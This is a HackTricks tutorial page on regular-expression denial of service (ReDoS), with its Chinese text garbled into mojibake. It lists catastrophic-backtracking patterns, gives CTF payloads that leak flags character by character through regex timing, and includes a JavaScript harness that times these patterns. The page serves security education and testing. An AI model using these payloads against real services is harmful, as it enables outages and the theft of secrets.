# æ­£åˆ™è¡¨è¾¾å¼æ‹’ç»æœåŠ¡ - ReDoS

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

# æ­£åˆ™è¡¨è¾¾å¼æ‹’ç»æœåŠ¡ï¼ˆReDoSï¼‰

**æ­£åˆ™è¡¨è¾¾å¼æ‹’ç»æœåŠ¡ï¼ˆReDoSï¼‰**å‘ç”Ÿåœ¨æœ‰äººåˆ©ç”¨æ­£åˆ™è¡¨è¾¾å¼ï¼ˆä¸€ç§åœ¨æ–‡æœ¬ä¸­æœç´¢å’ŒåŒ¹é…æ¨¡å¼çš„æ–¹æ³•ï¼‰å·¥ä½œæ–¹å¼çš„å¼±ç‚¹æ—¶ã€‚æœ‰æ—¶ï¼Œå½“ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ—¶ï¼Œå®ƒä»¬å¯èƒ½å˜å¾—éå¸¸ç¼“æ…¢ï¼Œç‰¹åˆ«æ˜¯å½“å®ƒä»¬å¤„ç†çš„æ–‡æœ¬ç‰‡æ®µå˜å¤§æ—¶ã€‚è¿™ç§ç¼“æ…¢å¯èƒ½ä¼šå˜å¾—éå¸¸ä¸¥é‡ï¼Œå³ä½¿æ–‡æœ¬å¤§å°ç•¥å¾®å¢åŠ ï¼Œé€Ÿåº¦ä¹Ÿä¼šå¿«é€Ÿå¢é•¿ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸ªé—®é¢˜ä½¿ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼çš„ç¨‹åºé•¿æ—¶é—´åœæ­¢æ­£å¸¸å·¥ä½œã€‚

## é—®é¢˜çš„æ­£åˆ™è¡¨è¾¾å¼å¤©çœŸç®—æ³•

**æŸ¥çœ‹è¯¦æƒ…ï¼š[https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)**

## æ¶æ„æ­£åˆ™è¡¨è¾¾å¼ <a href="#evil-regexes" id="evil-regexes"></a>

æ¶æ„æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼æ˜¯é‚£äº›å¯èƒ½**åœ¨ç²¾å¿ƒåˆ¶ä½œçš„è¾“å…¥ä¸Šå¡ä½å¯¼è‡´DoS**çš„æ¨¡å¼ã€‚æ¶æ„çš„æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼é€šå¸¸åŒ…å«é‡å¤çš„åˆ†ç»„å’Œé‡å¤æˆ–åœ¨é‡å¤ç»„å†…éƒ¨é‡å çš„äº¤æ›¿ã€‚ä¸€äº›æ¶æ„æ¨¡å¼çš„ç¤ºä¾‹åŒ…æ‹¬ï¼š

* (a+)+
* ([a-zA-Z]+)*
* (a|aa)+
* (a|a?)+
* (.*a){x}ï¼Œå…¶ä¸­ x > 10

æ‰€æœ‰è¿™äº›éƒ½å¯¹è¾“å…¥`aaaaaaaaaaaaaaaaaaaaaaaa!`æ˜“å—æ”»å‡»ã€‚

## ReDoSæœ‰æ•ˆè½½è·

### é€šè¿‡ReDoSè¿›è¡Œå­—ç¬¦ä¸²å¤–æ³„

åœ¨CTFï¼ˆæˆ–æ¼æ´èµé‡‘ï¼‰ä¸­ï¼Œä¹Ÿè®¸æ‚¨**æ§åˆ¶äº†ä¸æ•æ„Ÿä¿¡æ¯ï¼ˆæ ‡å¿—ï¼‰åŒ¹é…çš„æ­£åˆ™è¡¨è¾¾å¼**ã€‚ç„¶åï¼Œå¦‚æœ**æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…**ï¼Œè€Œ**ä¸åŒ¹é…**æ—¶**é¡µé¢å†»ç»“ï¼ˆè¶…æ—¶æˆ–æ›´é•¿çš„å¤„ç†æ—¶é—´ï¼‰**å¯èƒ½ä¼šå¾ˆæœ‰ç”¨ã€‚è¿™æ ·ï¼Œæ‚¨å°†èƒ½å¤Ÿ**é€ä¸ªå­—ç¬¦åœ°å¤–æ³„**å­—ç¬¦ä¸²ï¼š

* åœ¨[**è¿™ç¯‡æ–‡ç« **](https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets)ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°è¿™ä¸ªReDoSè§„åˆ™ï¼š`^(?=<flag>)((.*)*)*salt$`
* ç¤ºä¾‹ï¼š`^(?=HTB{sOmE_flÂ§NÂ§)((.*)*)*salt$`
* åœ¨[**è¿™ç¯‡è§£é¢˜æŠ¥å‘Š**](https://github.com/jorgectf/Created-CTF-Challenges/blob/main/challenges/TacoMaker%20%40%20DEKRA%20CTF%202022/solver/solver.html)ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°è¿™ä¸ªï¼š`<flag>(((((((.*)*)*)*)*)*)*)!`
* åœ¨[**è¿™ç¯‡è§£é¢˜æŠ¥å‘Š**](https://ctftime.org/writeup/25869)ä¸­ï¼Œä»–ä½¿ç”¨äº†ï¼š`^(?=${flag_prefix}).*.*.*.*.*.*.*.*!!!!$`

### ReDoSæ§åˆ¶è¾“å…¥å’Œæ­£åˆ™è¡¨è¾¾å¼

ä»¥ä¸‹æ˜¯æ‚¨**æ§åˆ¶**è¾“å…¥å’Œ**æ­£åˆ™è¡¨è¾¾å¼**çš„**ReDoS**ç¤ºä¾‹ï¼š
```javascript
function check_time_regexp(regexp, text){
var t0 = new Date().getTime();;
new RegExp(regexp).test(text);
var t1 = new Date().getTime();;
console.log("Regexp " + regexp + " took " + (t1 - t0) + " milliseconds.")
}

// This payloads work because the input has several "a"s
[
//  "((a+)+)+$",  //Eternal,
//  "(a?){100}$", //Eternal
"(a|a?)+$",
"(\\w*)+$",   //Generic
"(a*)+$",
"(.*a){100}$",
"([a-zA-Z]+)*$", //Generic
"(a+)*$",
].forEach(regexp => check_time_regexp(regexp, "aaaaaaaaaaaaaaaaaaaaaaaaaa!"))

/*
Regexp (a|a?)+$ took 5076 milliseconds.
Regexp (\w*)+$ took 3198 milliseconds.
Regexp (a*)+$ took 3281 milliseconds.
Regexp (.*a){100}$ took 1436 milliseconds.
Regexp ([a-zA-Z]+)*$ took 773 milliseconds.
Regexp (a+)*$ took 723 milliseconds.
*/
```
## å·¥å…·

* [https://github.com/doyensec/regexploit](https://github.com/doyensec/regexploit)
* [https://devina.io/redos-checker](https://devina.io/redos-checker)

## å‚è€ƒèµ„æ–™
* [https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)
* [https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets](https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets)
* [https://github.com/jorgectf/Created-CTF-Challenges/blob/main/challenges/TacoMaker%20%40%20DEKRA%20CTF%202022/solver/solver.html](https://github.com/jorgectf/Created-CTF-Challenges/blob/main/challenges/TacoMaker%20%40%20DEKRA%20CTF%202022/solver/solver.html)
* [https://ctftime.org/writeup/25869](https://ctftime.org/writeup/25869)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ä¸Šå…³æ³¨**æˆ‘ä»¬ã€‚
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
